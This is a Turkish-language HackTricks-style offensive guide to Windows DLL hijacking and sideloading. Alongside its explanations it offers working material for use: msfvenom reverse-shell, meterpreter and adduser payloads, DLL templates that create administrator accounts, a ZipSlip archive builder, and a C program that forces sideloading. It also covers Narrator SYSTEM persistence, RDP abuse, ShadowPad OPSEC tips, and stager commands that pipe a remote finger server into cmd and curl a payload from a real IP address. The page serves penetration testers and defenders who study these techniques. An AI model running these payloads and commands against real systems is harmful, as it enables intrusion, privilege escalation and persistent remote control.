# Dll Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Temel Bilgiler

DLL Hijacking, güvenilen bir uygulamanın kötü amaçlı bir DLL yükleyecek şekilde manipüle edilmesini içerir. Bu terim **DLL Spoofing, Injection, and Side-Loading** gibi birkaç taktiği kapsar. Genellikle kod yürütme, persistence sağlama ve daha az sık olarak ayrıcalık yükseltme için kullanılır. Burada yükseltme odaklı olsak da, hijacking yöntemi amaç ne olursa olsun aynıdır.

### Yaygın Yöntemler

Bir uygulamanın DLL yükleme stratejisine bağlı olarak her birinin etkinliği değişen birkaç yöntem kullanılır:

1. **DLL Replacement**: Gerçek bir DLL'i kötü amaçlı biriyle değiştirmek; orijinal DLL'in işlevselliğini korumak için isteğe bağlı olarak **DLL Proxying** kullanmak.
2. **DLL Search Order Hijacking**: Kötü amaçlı DLL'i, uygulamanın arama deseninde meşru DLL'den önce aranacak bir yola yerleştirmek.
3. **Phantom DLL Hijacking**: Uygulamanın yükleyeceğini sandığı, aslında mevcut olmayan bir DLL için kötü amaçlı bir DLL oluşturmak.
4. **DLL Redirection**: Uygulamanın kötü amaçlı DLL'i bulmasını sağlamak için `%PATH%` veya `.exe.manifest` / `.exe.local` gibi arama parametrelerini değiştirmek.
5. **WinSxS DLL Replacement**: WinSxS dizinindeki meşru DLL'in yerine kötü amaçlı bir muadil koymak; genellikle DLL side-loading ile ilişkilendirilen bir yöntem.
6. **Relative Path DLL Hijacking**: Kötü amaçlı DLL'i, kopyalanmış uygulama ile birlikte kullanıcı kontrollü bir dizine yerleştirmek; Binary Proxy Execution tekniklerine benzer.

> [!TIP]
> DLL sideloading üzerine HTML staging, AES-CTR konfigürasyonları ve .NET implantlarını katmanlandıran adım adım bir zincir için aşağıdaki iş akışını inceleyin.

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

## Eksik Dll'leri Bulma

Sistemdeki eksik DLL'leri bulmanın en yaygın yolu, sysinternals'tan [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) çalıştırmak ve **aşağıdaki 2 filtreyi** ayarlamaktır:

![](<../../../images/image (961).png>)

![](<../../../images/image (230).png>)

ve sadece **File System Activity**'yi gösterin:

![](<../../../images/image (153).png>)

Eğer **genel olarak eksik dll'ler** arıyorsanız bunu birkaç **saniye** çalışır bırakın.\
Eğer belirli bir yürütülebilir dosya içinde **eksik bir dll** arıyorsanız **başka bir filtre** (ör. "Process Name" "contains" `<exec name>`) ayarlayıp uygulamayı çalıştırmalı ve olay yakalamayı durdurmalısınız.

## Eksik Dll'lerin İstismarı

Ayrıcalıkları yükseltmek için en iyi şansımız, ayrıcalıklı bir işlemin yüklemeye çalışacağı bir DLL'i, o işlemin DLL arama yollarından birine yazabilmektir. Bu nedenle, DLL'in orijinalinin bulunduğu klasörden önce aranan bir klasöre bir DLL yazabiliyor olabiliriz (garip durum), ya da DLL herhangi bir klasörde mevcut değilken DLL'in aranacağı bir klasöre yazabiliyor olabiliriz.

### Dll Arama Sırası

**Inside the** [**Microsoft documentation**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **you can find how the Dlls are loaded specifically.**

**Windows uygulamaları**, DLL'leri önceden tanımlanmış arama yolları setini izleyerek ve belirli bir sıra takip ederek arar. DLL hijacking sorunu, zararlı bir DLL'in bu dizinlerden birine stratejik olarak yerleştirilmesi ve meşru DLL'den önce yüklenmesinin sağlanmasıyla ortaya çıkar. Bunu önlemenin bir çözümü, uygulamanın ihtiyaç duyduğu DLL'leri referans verirken mutlak yollar kullanmasını sağlamaktır.

32-bit sistemlerdeki **DLL arama sırasını** aşağıda görebilirsiniz:

1. Uygulamanın yüklendiği dizin.
2. System dizini. Bu dizinin yolunu almak için [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) fonksiyonunu kullanın.(_C:\Windows\System32_)
3. 16-bit system dizini. Bu dizinin yolunu döndüren bir fonksiyon yoktur, ancak aranır. (_C:\Windows\System_)
4. Windows dizini. Bu dizinin yolunu almak için [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) fonksiyonunu kullanın. (_C:\Windows_)
5. Geçerli dizin.
6. PATH environment variable içinde listelenen dizinler. Bu, **App Paths** kayıt anahtarı ile belirtilen uygulama başına yolu içermez. **App Paths** anahtarı DLL arama yolu hesaplanırken kullanılmaz.

Bu, **SafeDllSearchMode** etkinken varsayılan arama sırasıdır. Devre dışı bırakıldığında geçerli dizin ikinci konuma yükselir. Bu özelliği devre dışı bırakmak için **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** kayıt değerini oluşturun ve 0 olarak ayarlayın (varsayılan etkin).

Eğer [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) fonksiyonu **LOAD_WITH_ALTERED_SEARCH_PATH** ile çağrılırsa arama, **LoadLibraryEx**'in yüklediği yürütülebilir modülün dizininde başlar.

Son olarak, bir DLL sadece adı yerine mutlak yol belirtilerek de yüklenebilir. Bu durumda o DLL **sadece o yolda** aranır (DLL'in bağımlılıkları varsa, onlar sadece isimle yüklenecek şekilde aranır).

Arama sırasını değiştirebilecek başka yollar da vardır ancak bunları burada açıklamayacağım.

### Arbitrary file write'ı missing-DLL hijack'e zincirleme

1. DLL adlarını toplamak için ProcMon filtrelerini kullanın (`Process Name` = hedef EXE, `Path` ends with `.dll`, `Result` = `NAME NOT FOUND`) — süreç tarafından denenip bulunamayan DLL adlarını toplayın.
2. Eğer binary bir **schedule/service** üzerinde çalışıyorsa, bu isimlerden biriyle bir DLL'i **uygulama dizinine** (arama sırası girdisi #1) bırakmak bir sonraki çalıştırmada yüklenecektir. Bir .NET scanner örneğinde süreç, gerçek kopyayı `C:\Program Files\dotnet\fxr\...`'dan yüklemeden önce `C:\samples\app\` içinde `hostfxr.dll` arıyordu.
3. Herhangi bir export ile bir payload DLL oluşturun (ör. reverse shell): `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f dll -o hostfxr.dll`.
4. Eğer primitive'iniz ZipSlip-style arbitrary write ise, DLL'in uygulama klasörüne düşmesi için girişin extraction dir'den çıkmasını sağlayan bir ZIP hazırlayın:
```python
import zipfile
with zipfile.ZipFile("slip-shell.zip", "w") as z:
z.writestr("../app/hostfxr.dll", open("hostfxr.dll","rb").read())
```
5. Arşivi izlenen gelen kutusuna/paylaşıma teslim edin; zamanlanmış görev süreci yeniden başlatıldığında hedef, kötü amaçlı DLL'i yükler ve kodunuzu servis hesabı olarak çalıştırır.

### RTL_USER_PROCESS_PARAMETERS.DllPath üzerinden sideloading zorlama

Yeni oluşturulan bir sürecin DLL arama yolunu deterministik olarak etkilemenin gelişmiş bir yolu, süreci ntdll’in native API’leriyle oluştururken RTL_USER_PROCESS_PARAMETERS içindeki DllPath alanını ayarlamaktır. Buraya saldırgan kontrollü bir dizin sağlayarak, ithal edilmiş bir DLL'i adla çözen (mutlak yol kullanmayan ve güvenli yükleme bayraklarını kullanmayan) hedef süreç, o dizinden kötü amaçlı bir DLL yüklemeye zorlanabilir.

Temel fikir
- Süreç parametrelerini RtlCreateProcessParametersEx ile oluşturun ve kontrollü klasörünüze işaret eden özel bir DllPath sağlayın (ör. dropper/unpacker'ınızın bulunduğu dizin).
- Süreci RtlCreateUserProcess ile oluşturun. Hedef binary bir DLL'i adla çözdüğünde, loader çözümleme sırasında sağlanan bu DllPath'e bakacak; kötü amaçlı DLL hedef EXE ile aynı konumda olmasa bile güvenilir sideloading mümkün olacaktır.

Notlar/sınırlamalar
- Bu, oluşturulan alt süreci etkiler; sadece mevcut süreci etkileyen SetDllDirectory'den farklıdır.
- Hedef, bir DLL'i adla import etmeli veya LoadLibrary ile yüklemeli (mutlak yol kullanılmamalı ve LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories kullanılmamalı).
- KnownDLLs ve hardcoded mutlak yollar ele geçirilemez. Forwarded exports ve SxS önceliği değiştirebilir.

Minimal C örneği (ntdll, wide strings, basitleştirilmiş hata işleme):

<details>
<summary>Tam C örneği: RTL_USER_PROCESS_PARAMETERS.DllPath üzerinden DLL sideloading zorlamak</summary>
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
</details>

Operasyonel kullanım örneği
- Kötü amaçlı xmllite.dll (gerekli fonksiyonları dışa aktaran veya gerçek olanına proxy yapan) dosyasını DllPath dizininize yerleştirin.
- Yukarıdaki teknikle isminden xmllite.dll'yi aradığı bilinen imzalı bir ikiliyi başlatın. Loader import'u sağlanan DllPath üzerinden çözer ve DLL'inizi sideload eder.

Bu teknik, gerçek dünyada çok aşamalı sideloading zincirlerini tetiklemek için gözlemlenmiştir: ilk launcher bir yardımcı DLL bırakır, bu da ardından staging dizininden saldırganın DLL'inin yüklenmesini zorlamak için özel bir DllPath ile Microsoft-signed, hijackable bir ikili başlatır.


#### Exceptions on dll search order from Windows docs

Standart DLL arama sırasına ilişkin bazı istisnalar Windows dokümantasyonunda belirtilmiştir:

- When a **DLL that shares its name with one already loaded in memory** is encountered, the system bypasses the usual search. Instead, it performs a check for redirection and a manifest before defaulting to the DLL already in memory. **In this scenario, the system does not conduct a search for the DLL**.
- In cases where the DLL is recognized as a **known DLL** for the current Windows version, the system will utilize its version of the known DLL, along with any of its dependent DLLs, **forgoing the search process**. The registry key **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** holds a list of these known DLLs.
- Should a **DLL have dependencies**, the search for these dependent DLLs is conducted as though they were indicated only by their **module names**, regardless of whether the initial DLL was identified through a full path.

### Yetki Yükseltme

**Gereksinimler**:

- Farklı ayrıcalıklar altında (yatay veya lateral hareket) çalışan veya çalışacak ve **DLL eksikliği olan** bir süreci tespit edin.
- DLL'in aranacağı herhangi bir **dizine** yazma erişiminin (**write access**) olduğundan emin olun. Bu konum çalıştırılabilir dosyanın dizini veya sistem path'i içindeki bir dizin olabilir.

Evet, gereksinimleri bulmak karmaşıktır çünkü **varsayılan olarak ayrıcalıklı bir çalıştırılabilirin bir DLL eksik olması gariptir** ve bir sistem path klasöründe yazma izinlerine sahip olmak **daha da gariptir** (varsayılan olarak bunu yapamazsınız). Ancak yanlış yapılandırılmış ortamlarda bu mümkün olabilir.\
Şanslıysanız ve gereksinimleri karşıladığınızı görürseniz, [UACME](https://github.com/hfiref0x/UACME) projesine bakabilirsiniz. Projenin **ana hedefi UAC'yi atlamak** olsa bile, kullanabileceğiniz Windows sürümü için bir Dll hijaking **PoC**'u orada bulabilirsiniz (muhtemelen yazma izniniz olan klasörün yolunu değiştirmeniz yeterli olacaktır).

Not: Bir klasörde **izinlerinizi kontrol edebileceğinizi** şu şekilde:
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
Ve **PATH içindeki tüm klasörlerin izinlerini kontrol edin**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Bir executable için imports'ları ve bir dll için exports'ları şu komutla da kontrol edebilirsiniz:
```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
For a full guide on how to **Dll Hijacking'i kötüye kullanarak ayrıcalıkları yükseltme** with permissions to write in a **System Path folder** check:


{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### Automated tools

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) system PATH içindeki herhangi bir klasörde yazma izniniz olup olmadığını kontrol eder.\
Bu zafiyeti keşfetmek için diğer ilginç otomatik araçlar **PowerSploit functions**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ ve _Write-HijackDll_.

### Example

Eğer istismar edilebilir bir senaryo bulursanız, bunu başarılı şekilde istismar etmek için en önemli noktalardan biri, **çalıştırılabilir dosyanın ondan import edeceği en az tüm fonksiyonları export eden bir dll oluşturmak** olacaktır. Her neyse, Dll Hijacking'in [escalate from Medium Integrity level to High **(bypassing UAC)**](../../authentication-credentials-uac-and-efs/index.html#uac) veya [ **High Integrity to SYSTEM**](../index.html#from-high-integrity-to-system) için kullanışlı olduğunu unutmayın. You can find an example of **how to create a valid dll** inside this dll hijacking study focused on dll hijacking for execution: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows).\
Ayrıca, bir sonraki bölümde **temel dll kodları** bulabilirsiniz; bunlar **şablon** olarak veya **gerekli olmayan fonksiyonları export eden bir dll oluşturmak** için faydalı olabilir.

## **Creating and compiling Dlls**

### **Dll Proxifying**

Basically a **Dll proxy** is a Dll capable of **execute your malicious code when loaded** but also to **expose** and **work** as **exected** by **relaying all the calls to the real library**.

With the tool [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) or [**Spartacus**](https://github.com/Accenture/Spartacus) you can actually **indicate an executable and select the library** you want to proxify and **generate a proxified dll** or **indicate the Dll** and **generate a proxified dll**.

### **Meterpreter**

**Get rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Bir meterpreter (x86) edinin:**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Kullanıcı oluştur (x86, x64 sürümünü görmedim):**
```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### Kendi

Unutmayın: bazı durumlarda derlediğiniz Dll, victim process tarafından yüklenecek birkaç fonksiyonu **export several functions** olarak dışa aktarmalıdır; bu fonksiyonlar mevcut değilse **binary won't be able to load** them ve **exploit will fail**.

<details>
<summary>C DLL template (Win10)</summary>
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```
</details>
```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```
<details>
<summary>C++ DLL kullanıcı oluşturma örneği</summary>
```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```
</details>

<details>

<summary>İş parçacığı girişli alternatif C DLL</summary>
```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
</details>

## Vaka İncelemesi: Narrator OneCore TTS Localization DLL Hijack (Accessibility/ATs)

Windows Narrator.exe, başlangıçta tahmin edilebilir, dil-spesifik bir localization DLL'ini aramaya devam eder; bu DLL hijacked edilerek keyfi kod yürütme ve kalıcılık sağlanabilir.

Key facts
- Probe path (current builds): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Legacy path (older builds): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- If a writable attacker-controlled DLL exists at the OneCore path, it is loaded and `DllMain(DLL_PROCESS_ATTACH)` executes. No exports are required.

Discovery with Procmon
- Filter: `Process Name is Narrator.exe` and `Operation is Load Image` or `CreateFile`.
- Start Narrator and observe the attempted load of the above path.

Minimal DLL
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
// Optional OPSEC: DisableThreadLibraryCalls(h);
// Suspend/quiet Narrator main thread, then run payload
// (see PoC for implementation details)
}
return TRUE;
}
```
OPSEC silence
- A naive hijack will speak/highlight UI. To stay quiet, on attach enumerate Narrator threads, open the main thread (`OpenThread(THREAD_SUSPEND_RESUME)`) and `SuspendThread` it; continue in your own thread. See PoC for full code.

Trigger and persistence via Accessibility configuration
- User context (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- With the above, starting Narrator loads the planted DLL. On the secure desktop (logon screen), press CTRL+WIN+ENTER to start Narrator; your DLL executes as SYSTEM on the secure desktop.

RDP-triggered SYSTEM execution (lateral movement)
- Allow classic RDP security layer: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- RDP to the host, at the logon screen press CTRL+WIN+ENTER to launch Narrator; your DLL executes as SYSTEM on the secure desktop.
- Execution stops when the RDP session closes—inject/migrate promptly.

Bring Your Own Accessibility (BYOA)
- You can clone a built-in Accessibility Tool (AT) registry entry (e.g., CursorIndicator), edit it to point to an arbitrary binary/DLL, import it, then set `configuration` to that AT name. This proxies arbitrary execution under the Accessibility framework.

Notes
- Writing under `%windir%\System32` and changing HKLM values requires admin rights.
- All payload logic can live in `DLL_PROCESS_ATTACH`; no exports are needed.

## Case Study: CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe

This case demonstrates **Phantom DLL Hijacking** in Lenovo's TrackPoint Quick Menu (`TPQMAssistant.exe`), tracked as **CVE-2025-1729**.

### Vulnerability Details

- **Component**: `TPQMAssistant.exe` located at `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Scheduled Task**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` runs daily at 9:30 AM under the context of the logged-on user.
- **Directory Permissions**: Writable by `CREATOR OWNER`, allowing local users to drop arbitrary files.
- **DLL Search Behavior**: Attempts to load `hostfxr.dll` from its working directory first and logs "NAME NOT FOUND" if missing, indicating local directory search precedence.

### Exploit Implementation

An attacker can place a malicious `hostfxr.dll` stub in the same directory, exploiting the missing DLL to achieve code execution under the user's context:
```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
if (fdwReason == DLL_PROCESS_ATTACH) {
// Payload: display a message box (proof-of-concept)
MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
}
return TRUE;
}
```
### Saldırı Akışı

1. Standart bir kullanıcı olarak, `hostfxr.dll` dosyasını `C:\ProgramData\Lenovo\TPQM\Assistant\` dizinine drop edin.
2. Planlanmış görevin mevcut kullanıcı bağlamında sabah 9:30'da çalışmasını bekleyin.
3. Görev çalıştığında bir administrator oturumu açıksa, kötü amaçlı DLL administrator oturumunda medium integrity olarak çalışır.
4. medium integrity'den SYSTEM ayrıcalıklarına yükselmek için standart UAC bypass techniques zincirleyin.

## Vaka Çalışması: MSI CustomAction Dropper + DLL Side-Loading via Signed Host (wsc_proxy.exe)

Tehdit aktörleri sık sık MSI tabanlı droppers'ı DLL side-loading ile eşleştirir ve payload'ları güvenilir, imzalı bir process altında çalıştırır.

Chain overview
- Kullanıcı MSI'yi indirir. GUI kurulum sırasında (ör. LaunchApplication veya bir VBScript action) bir CustomAction sessizce çalışır ve gömülü kaynaklardan sonraki aşamayı yeniden oluşturur.
- Dropper aynı dizine meşru, imzalı bir EXE ve kötü amaçlı bir DLL yazar (örnek çift: Avast-imzalı wsc_proxy.exe + saldırgan kontrollü wsc.dll).
- İmzalı EXE başlatıldığında, Windows DLL search order çalışma dizininden önce wsc.dll'i yükler ve imzalı bir üst süreç altında saldırgan kodunu çalıştırır (ATT&CK T1574.001).

MSI analysis (what to look for)
- CustomAction table:
- Executable veya VBScript çalıştıran girdileri arayın. Şüpheli örüntü örneği: LaunchApplication'ın arka planda gömülü bir dosyayı çalıştırması.
- Orca içinde (Microsoft Orca.exe), CustomAction, InstallExecuteSequence ve Binary tablolarını inceleyin.
- MSI CAB içindeki gömülü/ayrılmış payload'lar:
- Administrative extract: msiexec /a package.msi /qb TARGETDIR=C:\out
- Ya da lessmsi kullanın: lessmsi x package.msi C:\out
- Bir VBScript CustomAction tarafından birleştirilen ve şifresi çözülen birden fazla küçük parça arayın. Yaygın akış:
```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```
Practical sideloading with wsc_proxy.exe
- Bu iki dosyayı aynı klasöre koyun:
- wsc_proxy.exe: meşru imzalı host (Avast). Süreç, wsc.dll'yi kendi dizininden isimle yüklemeye çalışır.
- wsc.dll: saldırgan DLL. Belirli exports'lara ihtiyaç yoksa, DllMain yeterli olabilir; aksi halde bir proxy DLL oluşturup gerekli exports'ları gerçek kütüphaneye yönlendirirken payload'u DllMain içinde çalıştırın.
- Minimal bir DLL payload oluşturun:
```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
}
return TRUE;
}
```
- İhraç gereksinimleri için, bir proxying framework'ü (ör. DLLirant/Spartacus) kullanarak aynı zamanda payload'unuzu çalıştıran bir yönlendirme DLL'i oluşturun.

- Bu teknik, host binary tarafından yapılan DLL isim çözümlemesine dayanır. Eğer host mutlak yollar veya güvenli yükleme flag'leri (ör. LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories) kullanıyorsa, hijack başarısız olabilir.
- KnownDLLs, SxS ve forwarded exports önceliği etkileyebilir ve host binary ile export kümesini seçerken göz önünde bulundurulmalıdır.

## İmzalı üçlüler + şifrelenmiş payload'lar (ShadowPad vaka incelemesi)

Check Point, Ink Dragon'ın çekirdek payload'u diskte şifreli tutarken meşru yazılımlarla karışmak için nasıl **üç dosyalı bir üçlü** kullandığını açıkladı:

1. **Signed host EXE** – AMD, Realtek veya NVIDIA gibi vendorler kötüye kullanılabiliyor (`vncutil64.exe`, `ApplicationLogs.exe`, `msedge_proxyLog.exe`). Saldırganlar yürütülebilir dosyayı Windows ikilisi gibi görünmesi için yeniden adlandırıyorlar (örneğin `conhost.exe`), fakat Authenticode imzası geçerli kalıyor.
2. **Malicious loader DLL** – EXE'nin yanına beklenen bir isimle bırakılıyor (`vncutil64loc.dll`, `atiadlxy.dll`, `msedge_proxyLogLOC.dll`). DLL genellikle ScatterBrain framework ile obfuskelenmiş bir MFC binary'sidir; tek görevi şifrelenmiş blob'u bulmak, şifresini çözmek ve ShadowPad'i reflectively map etmektir.
3. **Encrypted payload blob** – genellikle aynı dizinde `<name>.tmp` olarak saklanır. Decrypted payload belleğe eşlendikten sonra loader TMP dosyasını silerek adli delilleri yok eder.

Tradecraft notları:

* İmzalı EXE'yi yeniden adlandırmak (PE header içindeki orijinal `OriginalFileName` alanını koruyarak) ona bir Windows ikilisi gibi görünme imkanı verir ancak vendor imzasını korur; bu yüzden Ink Dragon’ın AMD/NVIDIA yardımcı programı olan `conhost.exe` görünümlü ikilileri bırakma yöntemini taklit edin.
* Yürütülebilir dosya güvenilir kaldığından, çoğu allowlisting kontrolü genellikle kötü amaçlı DLL'in onun yanında bulunmasını yeterli görür. Loader DLL üzerinde özelleştirmeye odaklanın; imzalı ebeveyn genellikle dokunulmadan çalıştırılabilir.
* ShadowPad’in decryptor'ı TMP blob'un loader'ın yanında yazılabilir olması bekler, böylece mapping sonrası dosyayı sıfırlayabilir. Payload belleğe yüklenene kadar dizini yazılabilir tutun; RAM'de çalışırken TMP dosyası OPSEC açısından güvenle silinebilir.

### LOLBAS stager + staged archive sideloading zinciri (finger → tar/curl → WMI)

Operatörler DLL sideloading'i LOLBAS ile eşleştirir, böylece diskteki tek özel artefakt güvenilen EXE'nin yanındaki kötü amaçlı DLL olur:

- **Remote command loader (Finger):** Gizli PowerShell `cmd.exe /c` başlatır, komutları bir Finger sunucusundan çeker ve bunları `cmd`'ye pipe'lar:

```powershell
powershell.exe Start-Process cmd -ArgumentList '/c finger Galo@91.193.19.108 | cmd' -WindowStyle Hidden
```
- `finger user@host` TCP/79 üzerinden metin çeker; `| cmd` sunucu yanıtını yürütür, böylece operatörler ikinci aşamayı sunucu tarafında döndürebilir.

- **Built-in download/extract:** Zararsız bir uzantıya sahip bir arşiv indirip açın, sideload hedefini ve DLL'i rastgele bir `%LocalAppData%` klasörü altına yerleştirin:

```powershell
$base = "$Env:LocalAppData"; $dir = Join-Path $base (Get-Random); curl -s -L -o "$dir.pdf" 79.141.172.212/tcp; mkdir "$dir"; tar -xf "$dir.pdf" -C "$dir"; $exe = "$dir\intelbq.exe"
```
- `curl -s -L` ilerlemeyi gizler ve yönlendirmeleri takip eder; `tar -xf` Windows'un yerleşik tar'ını kullanır.

- **WMI/CIM launch:** EXE'yi WMI üzerinden başlatın, böylece telemetri CIM tarafından oluşturulmuş bir süreç gösterirken beraberindeki DLL yüklenir:

```powershell
Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = "`"$exe`""}
```
- Yerel DLL'leri tercih eden ikililerle çalışır (ör. `intelbq.exe`, `nearby_share.exe`); payload (ör. Remcos) güvenilen ad altında çalıştırılır.

